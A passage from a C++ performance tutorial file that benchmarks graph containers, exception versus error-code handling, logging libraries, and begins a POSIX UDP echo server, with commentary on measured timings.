    std::vector<vertex_id_t> vertex_ids = make_vertex_ids(generator, graph_vertices_count_k);
    std::vector<float> old_scores(graph_vertices_count_k, 1.0f);
    std::vector<float> new_scores(graph_vertices_count_k, 0.0f);

    for (auto _ : state) {
        graph_type_ graph;
        graph.reserve({graph_vertices_count_k, graph_vertices_count_k * graph_vertices_degree_k});
        watts_strogatz(graph, generator, vertex_ids, graph_vertices_degree_k, 0.1f);
    }
}

using graph_unordered_maps = basic_graph_unordered_maps<>;
using graph_map = basic_graph_map<>;
using graph_flat_set = basic_graph_flat_set<>;

/**
 *  Let's imagine a Small World graph of a community of 2'500 people, a typical upper
 *  bound for what is considered a village, with roughly 200 connections per person,
 *  the Dunbar's number.
 */
BENCHMARK(graph_make<graph_unordered_maps>)
    ->MinTime(10)
    ->Name("graph_make<std::unordered_maps>")
    ->Unit(bm::kMicrosecond);
BENCHMARK(graph_make<graph_map>)->MinTime(10)->Name("graph_make<std::map>")->Unit(bm::kMicrosecond);
BENCHMARK(graph_make<graph_flat_set>)->MinTime(10)->Name("graph_make<absl::flat_set>")->Unit(bm::kMicrosecond);

template <                                                                     //
    typename graph_type_,                                                      //
    graph_allocation_mode_t allocation_ = graph_allocation_mode_t::global_k,   //
    graph_compaction_mode_t compaction_ = graph_compaction_mode_t::disabled_k, //
    execution_mode_t execution_ = execution_mode_t::serial_k                   //
    >

static void graph_rank(bm::State &state) {

    // Seed all graph types identically
    std::mt19937_64 generator(42);
    std::vector<vertex_id_t> vertex_ids = make_vertex_ids(generator, graph_vertices_count_k);
    std::vector<float> old_scores(graph_vertices_count_k, 1.0f);
    std::vector<float> new_scores(graph_vertices_count_k, 0.0f);

    // Build once
    graph_type_ graph;
    graph.reserve({graph_vertices_count_k, graph_vertices_count_k * graph_vertices_degree_k});
    watts_strogatz(graph, generator, vertex_ids, graph_vertices_degree_k, 0.1f);

    // Rank many times, with an even number of iterations per cycle to account for score swaps
    for (auto _ : state) { page_rank<execution_>(graph, vertex_ids, old_scores, new_scores, 2); }
}

/**
 *  Now let's rank those villagers, using the PageRank-like algorithm.
 */
BENCHMARK(graph_rank<graph_unordered_maps>)
    ->MinTime(10)
    ->Name("graph_rank<std::unordered_maps>")
    ->Unit(bm::kMicrosecond);
BENCHMARK(graph_rank<graph_map>)->MinTime(10)->Name("graph_rank<std::map>")->Unit(bm::kMicrosecond);
BENCHMARK(graph_rank<graph_flat_set>)->MinTime(10)->Name("graph_rank<absl::flat_set>")->Unit(bm::kMicrosecond);

/**
 *  After benchmarking on both x86 and ARM architectures, we can draw several
 *  interesting conclusions about our three graph implementations:
 *
 *  1. For graph construction (`graph_make`):
 *     - `std::unordered_map` consistently outperforms other containers, being ~2x faster
 *       than `std::map` on both architectures. This aligns with its O(1) insertion time.
 *     - `absl::flat_hash_set` falls between the two, being ~40% slower than `std::unordered_map`.
 *
 *  2. For the Page-Rank algorithm (`graph_rank`):
 *     - `absl::flat_hash_set` absolutely dominates, being ~150x faster than `std::unordered_map`
 *       on x86 and ~320x faster on ARM! This validates our custom hash function strategy.
 *     - `std::map` shrinks its gap with `std::unordered_map` during ranking,
 *       likely due to its cache-friendly tree traversal patterns.
 *
 *  What we've learned:
 *
 *  - For read-heavy workloads using flat memory layouts, `absl::flat_hash_set` is king.
 *  - Custom hash functions combined with transparent comparators are key to building efficient
 *    large-scale systems, like databases and recommendation engines.
 */

#pragma endregion // Trees, Graphs, and Data Layouts

#pragma region Smart Pointers

/**
 *  More often than not, people allocate nodes of graphs or trees individually,
 *  never considering @b implicit or @b succinct data-structures, as alternatives.
 */

#include <memory> // `std::unique_ptr`, `std::shared_ptr`, `std::weak_ptr`

#pragma endregion // Smart Pointers

#pragma region Concurrency

/**
 *  @see "C++ atomics, from basic to advanced. What do they really do?"
 *       by Fedor Pikus at CppCon 2017: https://youtu.be/ZQFzMfHIxng
 */

#include <atomic>       // `std::atomic`
#include <mutex>        // `std::mutex`
#include <shared_mutex> // `std::shared_mutex`

#pragma endregion // Concurrency

#pragma endregion // - Structures, Tuples, ADTs, AOS, SOA

#pragma region - Exceptions, Backups, Logging

#pragma region Errors

/**
 *  In the real world, control-flow gets messy, as different methods will
 *  break in different places. Let's imagine a system, that:
 *
 *  - Reads an integer from a text file.
 *  - Increments it.
 *  - Saves it back to the text file.
 *
 *  As soon as we start dealing with "external devices", as opposed to the CPU itself,
 *  failures become regular. The file may not exist, the integer may not be a number,
 *  the file may be read-only, the disk may be full, the file may be locked, etc.
 */
#include <charconv>  // `std::from_chars`, `std::to_chars`
#include <stdexcept> // `std::runtime_error`, `std::out_of_range`

constexpr std::size_t fail_period_read_integer_k = 6;
constexpr std::size_t fail_period_convert_to_integer_k = 11;
constexpr std::size_t fail_period_next_string_k = 17;
constexpr std::size_t fail_period_write_back_k = 23;

double get_max_value(std::vector<double> const &v) noexcept { return *(std::max_element(std::begin(v), std::end(v))); }

static std::string read_integer_from_file_or_throw( //
    [[maybe_unused]] std::string const &filename, std::size_t iteration_index) noexcept(false) {
    if (iteration_index % fail_period_read_integer_k == 0) throw std::runtime_error("File read failed");
    if (iteration_index % fail_period_convert_to_integer_k == 0) return "abc";
    // Technically, the constructor may throw `std::bad_alloc` if the allocation fails,
    // but given the Small String Optimization, it shouldn't happen in practice.
    return "1";
}

static std::size_t string_to_integer_or_throw( //
    std::string const &value, [[maybe_unused]] std::size_t iteration_index) noexcept(false) {
    // The `std::stoull` function may throw:
    // - `std::invalid_argument` if no conversion could be performed.
    // - `std::out_of_range` if the converted value would fall out of the range of the
    //   result type or if the underlying function sets `errno` to `ERANGE`.
    // The cleaner modern way to implement this is using `std::from_chars` in C++17.
    std::size_t integral_value = 0;
    std::from_chars_result result = std::from_chars(value.data(), value.data() + value.size(), integral_value);
    if (result.ec != std::errc()) throw std::out_of_range("Conversion failed");
    return integral_value;
}

static std::string integer_to_next_string_or_throw(std::size_t value, std::size_t iteration_index) noexcept(false) {
    if (iteration_index % fail_period_next_string_k == 0) throw std::runtime_error("Increment failed");
    value++;
    constexpr std::size_t buffer_size = 10;
    char buffer[buffer_size] {};
    std::to_chars_result result = std::to_chars(buffer, buffer + buffer_size, value);
    if (result.ec != std::errc()) throw std::out_of_range("Conversion failed");
    return std::string(buffer, result.ptr - buffer);
}

static void write_to_file_or_throw( //
    [[maybe_unused]] std::string const &filename, [[maybe_unused]] std::string const &value,
    std::size_t iteration_index) noexcept(false) {
    if (iteration_index % fail_period_write_back_k == 0) throw std::runtime_error("File write failed");
}

static void errors_throw(bm::State &state) {
    std::string const filename = "test.txt";
    std::size_t iteration_index = 0;
    for (auto _ : state) {
        iteration_index++;
        try {
            std::string read_value = read_integer_from_file_or_throw(filename, iteration_index);
            std::size_t integer_value = string_to_integer_or_throw(read_value, iteration_index);
            std::string next_value = integer_to_next_string_or_throw(integer_value, iteration_index);
            write_to_file_or_throw(filename, next_value, iteration_index);
        }
        catch (std::exception const &) {
        }
    }
}

BENCHMARK(errors_throw)->ComputeStatistics("max", get_max_value)->MinTime(2);
BENCHMARK(errors_throw)->ComputeStatistics("max", get_max_value)->MinTime(2)->Threads(physical_cores());

/**
 *  Until C++23, we don't have a `std::expected` implementation,
 *  but it's easy to design one using `std::variant` and `std::error_code`.
 */
#include <system_error> // `std::error_code`
#include <variant>      // `std::variant`

using std::operator""s;

template <typename value_type_>
class expected {
    std::variant<value_type_, std::error_code> value_;

  public:
    expected(value_type_ const &value) noexcept : value_(value) {}
    expected(std::error_code const &error) noexcept : value_(error) {}

    explicit operator bool() const noexcept { return std::holds_alternative<value_type_>(value_); }
    value_type_ const &value() const noexcept { return std::get<value_type_>(value_); }
    std::error_code const &error() const noexcept { return std::get<std::error_code>(value_); }
    template <typename function_type_>
    auto and_then(function_type_ &&f) const noexcept {
        if (std::holds_alternative<value_type_>(value_)) return f(std::get<value_type_>(value_));
        return *this;
    }
};

static expected<std::string> read_integer_from_file_or_variants( //
    [[maybe_unused]] std::string const &filename, std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_read_integer_k == 0) return std::error_code {EIO, std::generic_category()};
    if (iteration_index % fail_period_convert_to_integer_k == 0) return "abc"s;
    // Technically, the constructor may throw `std::bad_alloc` if the allocation fails,
    // but given the Small String Optimization, it shouldn't happen in practice.
    return "1"s;
}

static expected<std::size_t> string_to_integer_or_variants( //
    std::string const &value, [[maybe_unused]] std::size_t iteration_index) noexcept {
    std::size_t integral_value = 0;
    std::from_chars_result result = std::from_chars(value.data(), value.data() + value.size(), integral_value);
    if (result.ec != std::errc()) return std::make_error_code(result.ec);
    return integral_value;
}

static expected<std::string> integer_to_next_string_or_variants(std::size_t value,
                                                                std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_next_string_k == 0) return std::error_code {EIO, std::generic_category()};
    value++;
    constexpr std::size_t buffer_size = 10;
    char buffer[buffer_size] {};
    std::to_chars_result result = std::to_chars(buffer, buffer + buffer_size, value);
    if (result.ec != std::errc()) return std::make_error_code(result.ec);
    return std::string(buffer, result.ptr - buffer);
}

static std::error_code write_to_file_or_variants( //
    [[maybe_unused]] std::string const &filename, [[maybe_unused]] std::string const &value,
    std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_write_back_k == 0) return std::error_code {EIO, std::generic_category()};
    return std::error_code {};
}

static void errors_variants(bm::State &state) {
    std::string const filename = "test.txt";
    std::size_t iteration_index = 0;
    for (auto _ : state) {
        iteration_index++;
        auto read_result = read_integer_from_file_or_variants(filename, iteration_index);
        if (!read_result) continue;
        auto integer_result = string_to_integer_or_variants(read_result.value(), iteration_index);
        if (!integer_result) continue;
        auto next_result = integer_to_next_string_or_variants(integer_result.value(), iteration_index);
        if (!next_result) continue;
        auto write_error = write_to_file_or_variants(filename, next_result.value(), iteration_index);
        bm::DoNotOptimize(write_error);
    }
}

BENCHMARK(errors_variants)->ComputeStatistics("max", get_max_value)->MinTime(2);
BENCHMARK(errors_variants)->ComputeStatistics("max", get_max_value)->MinTime(2)->Threads(physical_cores());

/**
 *  As practice shows, STL is almost never the performance-oriented choice!
 *  It's often good enough to get started, but every major player reimplements
 *  STL-like primitives for its own needs. In some cases, no primitives are
 *  needed at all, as the language itself provides the necessary tools.
 *
 *  Instead of using the heavy `std::variant`, that will contain an integer
 *  to distinguish between the value and the error, plus the heavy error object
 *  itself, we can use a simple `struct` with a status code.
 */
enum class status : unsigned int {
    success,
    read_failed,
    convert_failed,
    increment_failed,
    write_failed,
};

template <typename value_type_>
struct result {
    value_type_ value;
    status status_code;
};

static result<std::string> read_integer_from_file_with_status( //
    [[maybe_unused]] std::string const &filename, std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_read_integer_k == 0) return {{}, status::read_failed};
    if (iteration_index % fail_period_convert_to_integer_k == 0) return {"abc"s, status::success};
    // Technically, the constructor may throw `std::bad_alloc` if the allocation fails,
    // but given the Small String Optimization, it shouldn't happen in practice.
    return {"1"s, status::success};
}

static result<std::size_t> string_to_integer_with_status( //
    std::string const &value, [[maybe_unused]] std::size_t iteration_index) noexcept {
    std::size_t integral_value = 0;
    std::from_chars_result result = std::from_chars(value.data(), value.data() + value.size(), integral_value);
    if (result.ec != std::errc()) return {0, status::convert_failed};
    return {integral_value, status::success};
}

static result<std::string> integer_to_next_string_with_status(std::size_t value, std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_next_string_k == 0) return {{}, status::increment_failed};
    value++;
    constexpr std::size_t buffer_size = 10;
    char buffer[buffer_size] {};
    std::to_chars_result result = std::to_chars(buffer, buffer + buffer_size, value);
    if (result.ec != std::errc()) return {{}, status::increment_failed};
    return {std::string(buffer, result.ptr - buffer), status::success};
}

static status write_to_file_with_status( //
    [[maybe_unused]] std::string const &filename, [[maybe_unused]] std::string const &value,
    std::size_t iteration_index) noexcept {
    if (iteration_index % fail_period_write_back_k == 0) return status::write_failed;
    return status::success;
}

static void errors_with_status(bm::State &state) {
    std::string const filename = "test.txt";
    std::size_t iteration_index = 0;
    for (auto _ : state) {
        iteration_index++;
        auto [read_result, read_status] = read_integer_from_file_with_status(filename, iteration_index);
        if (read_status != status::success) continue; // In large programs, consider adding `[[unlikely]]`
        auto [integer_result, integer_status] = string_to_integer_with_status(read_result, iteration_index);
        if (integer_status != status::success) continue; // In large programs, consider adding `[[unlikely]]`
        auto [next_result, next_status] = integer_to_next_string_with_status(integer_result, iteration_index);
        if (next_status != status::success) continue; // In large programs, consider adding `[[unlikely]]`
        auto write_status = write_to_file_with_status(filename, next_result, iteration_index);
        bm::DoNotOptimize(write_status);
    }
}

BENCHMARK(errors_with_status)->ComputeStatistics("max", get_max_value)->MinTime(2);
BENCHMARK(errors_with_status)->ComputeStatistics("max", get_max_value)->MinTime(2)->Threads(physical_cores());

/**
 *  On Intel Sapphire Rapids:
 *  - Throwing an STL exception: @b 268ns single-threaded, @b 815ns multi-threaded.
 *  - Returning an STL error code: @b 7ns single-threaded, @b 24ns multi-threaded.
 *  - Returning a custom status code: @b 4ns single-threaded, @b 15ns multi-threaded.
 *
 *  On Apple M2 Pro:
 *  - Throwing an STL exception: @b 728ns single-threaded, @b 837ns multi-threaded.
 *  - Returning an STL error code: @b 12ns single-threaded, @b 13ns multi-threaded.
 *  - Returning a custom status code: @b 7ns single-threaded, @b 7ns multi-threaded.
 *
 *  Those numbers explain, why over 20% of the industry members explicitly ban exceptions
 *  in their codebases, according to the 2020 Developer Ecosystem Survey by JetBrains.
 *
 *  @see "De-fragmenting C++: Making Exceptions and RTTI More Affordable and Usable"
 *       by Herb Sutter at CppCon 2019: https://youtu.be/ARYP83yNAWk
 *  @see "The State of Developer Ecosystem 2020" from JetBrains:
 *       https://www.jetbrains.com/lp/devecosystem-2020/cpp/
 *  @see "Better 'Goodput' Performance through C++ Exception Handling" from ScyllaDB:
 *       https://www.scylladb.com/2024/05/14/better-goodput-performance-through-c-exception-handling/
 */

#pragma endregion // Errors

#pragma region Logs
#if defined(__cpp_lib_source_location)

/**
 *  Similar to error handling, logging can be done in different ways.
 *  Nice logs may look like this:
 *
 *      [time] | [filename]:[source-line] <[code]> "[message]"
 *
 *  The time should be in a ISO 8601 format, and a line for `EPERM` may look like this:
 *
 *      YYYY-MM-DDTHH:MM:SS.mmm | less_slow.cpp:2053 <1> "Operation not permitted"
 *
 *  C++ has one of the best standard libraries for time - `std::chrono`, and one of
 *  the most powerful formatting libraries - `std::format`, derived from `fmt::`.
 *  Both are more capable than most users realize!
 */
#include <chrono>          // `std::chrono`
#include <source_location> // `std::source_location`
#include <string_view>     // `std::string_view`

using std::string_view_literals::operator""sv;

template <typename logger_type_>
static void logging(bm::State &state) {
    struct {
        int code;
        std::string_view message;
    } errors[3] = {
        {1, "Operation not permitted"sv},
        {12, "Cannot allocate memory"sv},
        {113, "No route to host"sv},
    };
    char buffer[1024];
    logger_type_ logger;
    std::size_t iteration_index = 0;
    std::size_t bytes_logged = 0;
    for (auto _ : state) {
        bytes_logged += logger(              //
            buffer, sizeof(buffer),          //
            std::source_location::current(), //
            errors[iteration_index % 3].code, errors[iteration_index % 3].message);
        iteration_index++;
    }
    state.SetBytesProcessed(bytes_logged);
}

struct log_printf_t {
    std::size_t operator()(                    //
        char *buffer, std::size_t buffer_size, //
        std::source_location const &location, int code, std::string_view message) const noexcept {
        // On MSVC, the `high_resolution_clock` is the `steady_clock`, which won't work with `to_time_t`.
        // `std::chrono::high_resolution_clock` is usually just an alias to either `system_clock` or
        // `steady_clock`. There is debate on whether using it is a good idea at all.
        // https://en.cppreference.com/w/cpp/chrono/high_resolution_clock
#if defined(_MSC_VER)
        auto now = std::chrono::system_clock::now();
#else
        auto now = std::chrono::high_resolution_clock::now();
#endif
        auto time_since_epoch = now.time_since_epoch();

        // Extract seconds and milliseconds
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(time_since_epoch);
        auto milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(time_since_epoch) - seconds;

        // Format as ISO 8601: YYYY-MM-DDTHH:MM:SS.mmm
        auto time_t_now = std::chrono::system_clock::to_time_t(now);
        auto tm = std::gmtime(&time_t_now); // UTC only, no local timezone dependency

        int count_bytes = std::snprintf( //
            buffer, buffer_size,
            "%04d-%02d-%02dT%02d:%02d:%02d.%03dZ | "                                     // time format
            "%s:%d <%03d> "                                                              // location and code format
            "\"%.*s\"\n",                                                                // message format
            tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,                             // date
            tm->tm_hour, tm->tm_min, tm->tm_sec, static_cast<int>(milliseconds.count()), // time
            location.file_name(), location.line(), code,                                 // location and code
            static_cast<int>(message.size()), message.data()                             // message of known length
        );
        return static_cast<std::size_t>(count_bytes);
    }
};

BENCHMARK(logging<log_printf_t>)->Name("log_printf")->MinTime(2);

#if !defined(_MSC_VER)
#if defined(__cpp_lib_format)
#include <format> // `std::format_to_n`

struct log_format_t {
    std::size_t operator()(                    //
        char *buffer, std::size_t buffer_size, //
        std::source_location const &location, int code, std::string_view message) const noexcept {

        auto now = std::chrono::high_resolution_clock::now();
        auto time_since_epoch = now.time_since_epoch();

        // Extract seconds and milliseconds
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(time_since_epoch);
        auto milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(time_since_epoch) - seconds;

        // ISO 8601 defines the format as: YYYY-MM-DDTHH:MM:SS.mmm
        // `%F` unpacks to `%Y-%m-%d`, implementing the "YYYY-MM-DD" part
        // `%T` would expand to `%H:%M:%S`, implementing the "HH:MM:SS" part
        // To learn more about syntax, read: https://fmt.dev/11.0/syntax/
        std::format_to_n_result<char *> result = std::format_to_n( //
            buffer, buffer_size,
            "{:%FT%R}:{:0>2}.{:0>3}Z | "                     // time format
            "{}:{} <{:0>3}> "                                // location and code format
            "\"{}\"\n",                                      // message format
            now, static_cast<unsigned int>(seconds.count()), // date and time
            static_cast<unsigned int>(milliseconds.count()), // milliseconds
            location.file_name(), location.line(), code,     // location and code
            message                                          // message of known length
        );
        return static_cast<std::size_t>(result.size);
    }
};

BENCHMARK(logging<log_format_t>)->Name("log_format")->MinTime(2);

#endif                   // defined(__cpp_lib_format)
#include <fmt/core.h>    // `std::format_to_n`
#include <fmt/compile.h> // compile-time format strings
#include <fmt/chrono.h>  // formatting for `std::chrono` types

struct log_fmt_t {
    std::size_t operator()(                    //
        char *buffer, std::size_t buffer_size, //
        std::source_location const &location, int code, std::string_view message) const noexcept {
        auto now = std::chrono::high_resolution_clock::now();
        auto time_since_epoch = now.time_since_epoch();

        // Extract seconds and milliseconds
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(time_since_epoch);
        auto milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(time_since_epoch) - seconds;

        // ISO 8601 defines the format as: YYYY-MM-DDTHH:MM:SS.mmm
        // `%F` unpacks to `%Y-%m-%d`, implementing the "YYYY-MM-DD" part
        // `%T` would expand to `%H:%M:%S`, implementing the "HH:MM:SS" part
        // To learn more about syntax, read: https://fmt.dev/11.0/syntax/
        fmt::format_to_n_result<char *> result = fmt::format_to_n( //
            buffer, buffer_size,
            FMT_COMPILE(                                     //
                "{:%FT%R}:{:0>2}.{:0>3}Z | "                 // time format
                "{}:{} <{:0>3}> "                            // location and code format
                "\"{}\"\n"),                                 // message format
            now, static_cast<unsigned int>(seconds.count()), // date and time
            static_cast<unsigned int>(milliseconds.count()), // milliseconds
            location.file_name(), location.line(), code,     // location and code
            message                                          // message of known length
        );
        return static_cast<std::size_t>(result.size);
    }
};

BENCHMARK(logging<log_fmt_t>)->Name("log_fmt")->MinTime(2);

/**
 *  The results for the logging benchmarks are as follows:
 *  - `log_printf`: @b 321ns
 *  - `log_format`: @b 416ns
 *  - `log_fmt`: @b 171ns
 *
 *  The `std::format` is based on the `fmt`, but it's clearly very far behind.
 *  The lack of compile-time format definitions and custom allocators support
 *  make the adaptation unusable for high-performance logging.
 *
 *  @see "{fmt} is Addictive! Using {fmt} and spdlog"
 *       by Jason Turner for C++ Weekly - Ep. 135: https://youtu.be/KeS1ehp9IiI
 *  @see "A modern formatting library for C++" by Victor Zverovich at CppCon 2017:
 *       https://youtu.be/ptba_AqFYCM
 */

#endif            // !defined(_MSC_VER)
#endif            // defined(__cpp_lib_source_location)
#pragma endregion // Logs

#pragma endregion // - Exceptions, Backups, Logging

#pragma region - Networking and Databases

/**
 *  There are legends about the complexity of dependency management in C++.
 *  It often prohibits developers from designing larger systems in C++, as
 *  the Web, for example, requires a lot of dependencies.
 *
 *  Let's demystify the process by building an @b "echo" RPC server and client,
 *  starting them within the same process and measuring the round-trip time.
 *  This will teach us about the overhead of user-space vs kernel-space IO,
 *  and the network stack in general. To benchmark both the latency and
 *  throughput, we should process packets @b Out-Of-Order, keeping a reusable
 *  buffer for incoming and outgoing packets. Keeping
 *
 *  Hopefully, it will also show, how ugly can state-management get in
 *  Systems Design, and that reverting to abstraction-less C can often be a
 *  better choice.
 *
 *  The naive approach would be to take the TCP/IP stack use LibC's native
 *  @b `socket/bind/listen/accept/connect/send/recv` functions, just like
 *  90% of the industry does. That solution is so bad, I don't know where
 *  to start.
 *
 *  As you can see in the above examples, the common theme of this repo is
 *  not relying on general purpose solutions and not pushing the problem
 *  somewhere else out of laziness. Like, when you know your memory allocation
 *  pattern, you shouldn't just expect the general purpose system-level allocator
 *  to be better than your custom one. If you know how your code scales across
 *  CPU cores, don't just spawn a million threads hoping the OS scheduler will
 *  do a better job than yours. As we get to higher-level Systems, like
 *  networking, it's expected that we will have to deal with the same problems.
 *
 *  LibC manages memory for you to grow and shrink buffers for incoming and
 *  outgoing packets. It then introduces [operating] @b system-calls that can take
 *  arbitrary time to complete. Until then, your thread is blocked, and you can't
 *  do anything else. You'd pay for at least 2 context switches per packet,
 *  one to the kernel and one back to the user-space.
 *
 *  @b ASIO is the default way C++ developers do networking. It comes in @b three
 *  flavors, no less: standalone, @b Boost.Asio and the @b NetworkingTS for the
 *  future STL releases. It's slightly better, than using LibC, but we will see
 *  that there is an even better way with @b io_uring and @b DPDK.
 *
 *  If we drop the TCP stack, we need to track Out-Of-Order execution ourselves.
 *  If some UDP packets are lost, we need to be able to continue the benchmark.
 *  When the UDP packets are received, we need to track the time they took to
 *  complete the round trip. A truly efficient design will be overly complicated
 *  for a tutorial, but if we amortize the cost of logic with @b batching, we can
 *  get a good-enough solution. As for it's functionality:
 *
 *  - It won't perform retries on lost packets
 *  - It won't be able to handle packets larger than the MTU
 *  - It won't be able to handle packets that are fragmented
 *
 *  For something more serious, check out Unum's UCall 😉
 *
 *  @see Most recent ASIO docs: https://think-async.com/Asio/asio-1.30.2/doc/asio/overview.html
 *  @see "User Datagram Protocol" on Wikipedia: https://en.wikipedia.org/wiki/User_Datagram_Protocol
 *  @see "Asio 201 - timeouts, cancellation & custom tokens" by Klemens Morgenstern:
 *       https://cppalliance.org/asio/2023/01/02/Asio201Timeouts.html
 *
 *  If locally on ping-pong interaction takes on average 10 microseconds, then
 *  a batch of 1000 packets should take 10 milliseconds.
 */
constexpr std::chrono::milliseconds rpc_packet_timeout_k = std::chrono::milliseconds(1);
constexpr std::chrono::milliseconds rpc_batch_timeout_k = std::chrono::milliseconds(10);

struct rpc_batch_result {
    std::size_t sent_packets = 0;
    std::size_t received_packets = 0;
    std::chrono::nanoseconds batch_latency = std::chrono::nanoseconds::zero();
    std::chrono::nanoseconds max_packet_latency = std::chrono::nanoseconds::zero();

    rpc_batch_result &operator+=(rpc_batch_result const &other) {
        sent_packets += other.sent_packets;
        received_packets += other.received_packets;
        batch_latency += other.batch_latency;
        max_packet_latency = std::max(max_packet_latency, other.max_packet_latency);
        return *this;
    }
};

enum class networking_route_t { loopback_k, public_k };

/**
 *  The User Datagram Protocol (UDP) is OSI Layer 4 "Transport protocol", and
 *  should be able to operate on top of any OSI Layer 3 "Network protocol".
 *
 *  In most cases, it operates on top of the Internet Protocol (IP), which can
 *  have Maximum Transmission Unit (MTU) ranging 20 for IPv4 and 40 for IPv6
 *  to 65535 bytes. In our case, however, the OSI Layer 2 "Data Link Layer" is
 *  likely to be Ethernet, which has a MTU of 1500 bytes, but most routers are
 *  configured to fragment packets larger than 1460 bytes. Hence, our choice!
 */
constexpr std::size_t rpc_mtu_k = 1460;
using rpc_buffer_t = std::array<char, rpc_mtu_k>;
constexpr uint16_t rpc_port_k = 12345;

auto to_microseconds(auto duration) { return std::chrono::duration_cast<std::chrono::microseconds>(duration); }

std::string execute_system_call(std::string const &command) {
    std::array<char, 1024> buffer {};
    std::string result;
    if (FILE *pipe = popen(command.c_str(), "r")) {
        while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe)) result += buffer.data();
        pclose(pipe);
    }
    return result;
}

std::string raise_system_error(std::string const &message) {
    std::string error_message = message + ": " + std::strerror(errno) + " (" + std::to_string(errno) + ")";
    throw std::runtime_error(error_message);
}

/**
 *  @brief Fetches the public IP address of the default networking
 *         interface on the current machine.
 */
std::string fetch_public_ip() {
#if defined(__linux__)
    // Try Linux approach
    std::string command = R"(ip route get 8.8.8.8 | sed -nE 's/.*src ([0-9\.]+).*/\1/p')";
    std::string output = execute_system_call(command);
    // Trim whitespace
    if (!output.empty())
        while (!output.empty() && isspace(output.back())) output.pop_back();
    return output;
#elif defined(__APPLE__)
    // Try macOS approach with `ipconfig getifaddr en0`
    std::string command = "ipconfig getifaddr en0";
    std::string output = execute_system_call(command);
    // Trim whitespace
    if (!output.empty())
        while (!output.empty() && isspace(output.back())) output.pop_back();

    return output; // Could still be empty
#else
    return {};
#endif
}

/**
 *  @brief Emulates some message processing logic, that will update the `input` packet
 *         and write the result to the `output` buffer, returning the output length.
 *
 *  This function will be called on the server size to reply each message.
 *  It is also called on the client side to validate the received response.
 */
std::size_t packet_modify(char const *input, std::size_t input_length, char *output) {
    // Echo the input packet back. Any wiser suggestions?
    std::memcpy(output, input, input_length);
    return input_length;
}

#pragma region POSIX

/**
 *  POSIX is an open standard (IEEE 1003) that defines a wide range of operating-system-level
 *  interfaces and utilities, including file I/O, process control, threading, and networking.
 *  Networking functions such as `socket`, `select`, `bind`, `send`, and `recv` come from
 *  the POSIX specification.
 *
 *  In our case, focusing on UDP, we will use `sendto` and `recvfrom` functions, as in stateless
 *  protocols, the server does not maintain any information about the client, and the client does
 *  not maintain any information about the server. Each packet is treated independently.
 *
 *  Unlike other implementations, this one is synchronous and should result in the worst performance.
 */
#include <arpa/inet.h>  // `inet_addr`
#include <netinet/in.h> // `sockaddr_in`
#include <sys/socket.h> // `socket`, `bind`, `sendto`, `recvfrom`

#include <array>  // `std::array` for packet buffers
#include <atomic> // `std::atomic_bool` for stopping the server

struct addressed_socket_t {
    int socket_descriptor;
    sockaddr_in server_address;
};

/**
 *  @brief  Opens the socket and binds it to the specified address and port.
 *  @param  port The port to bind to.
 *  @param  address The address to bind to. If "0.0.0.0" for IPv4 (or "::" for IPv6),
 *          we bind to all interfaces, meaning we can receive packets from any network
 *          interface. Binding to "127.0.0.1" (or "::1" for IPv6) will only allow
 *          packets from the loopback interface, which can be handy for testing.
 */
addressed_socket_t rpc_server_socket(std::uint16_t port, std::string const &address = "0.0.0.0") {
    addressed_socket_t server;
    // Initialize socket
    server.socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
    if (server.socket_descriptor < 0) raise_system_error("Failed to create socket");

    // Allow port reuse
    int const socket_option = 1;
    if (setsockopt(server.socket_descriptor, SOL_SOCKET, SO_REUSEADDR, &socket_option, sizeof(socket_option)) < 0)
        raise_system_error("Failed to set SO_REUSEADDR");

    // Bind to address and port
    server.server_address.sin_family = AF_INET;
    server.server_address.sin_addr.s_addr = inet_addr(address.c_str());
    server.server_address.sin_port = htons(port);
    if (bind(server.socket_descriptor, reinterpret_cast<sockaddr *>(&server.server_address),
             sizeof(server.server_address)) < 0)
        raise_system_error("Failed to bind socket");
    return server;
}

/**
 *  @brief  Opens the socket and resolves the server address.
 *  @param  port The port to bind to on the server.
 *  @param  address The address to bind to on the server.
 */
addressed_socket_t rpc_client_socket(std::string const &server_addr, std::uint16_t port) {
    addressed_socket_t client;
    // Initialize socket
    client.socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
    if (client.socket_descriptor < 0) raise_system_error("Failed to create socket");

    // Resolve server address
    client.server_address.sin_family = AF_INET;
    client.server_address.sin_addr.s_addr = inet_addr(server_addr.c_str());
    client.server_address.sin_port = htons(port);
    return client;
}

/**
 *  @brief  A minimal RPC @b server using LibC functionality to setup the UDP socket,
 *          and synchronous blocking POSIX calls to receive and send packets -
 *          @b one at a time!
 */
class rpc_libc_server {
    int socket_descriptor_;
    sockaddr_in server_address_;
    std::atomic_bool should_stop_;

  public:
    rpc_libc_server(std::string const &server_address_str, std::uint16_t port, std::size_t max_concurrency)
        : should_stop_(false) {
        auto [socket_descriptor, server_address] = rpc_server_socket(port, server_address_str);
        socket_descriptor_ = socket_descriptor;
        server_address_ = server_address;

        // Let's make sure we don't block forever on `recvfrom`
        struct timeval duration;
        duration.tv_sec = 0;
        duration.tv_usec = to_microseconds(rpc_batch_timeout_k).count();
        if (setsockopt(socket_descriptor_, SOL_SOCKET, SO_RCVTIMEO, &duration, sizeof(duration)) < 0)
            raise_system_error("Failed to set sockets batch timeout");
    }

    ~rpc_libc_server() noexcept {}
    void close() noexcept { ::close(socket_descriptor_); }
    void stop() noexcept { should_stop_.store(true, std::memory_order_seq_cst); }

    void operator()() noexcept {
        sockaddr_in client_address;
        socklen_t client_len = sizeof(client_address);
        rpc_buffer_t receive_buffer, send_buffer;

        while (!should_stop_.load(std::memory_order_seq_cst)) {
            ssize_t received_length = recvfrom(socket_descriptor_, receive_buffer.data(), receive_buffer.size(), 0,
                                               reinterpret_cast<sockaddr *>(&client_address), &client_len);
            if (received_length <= 0) continue;
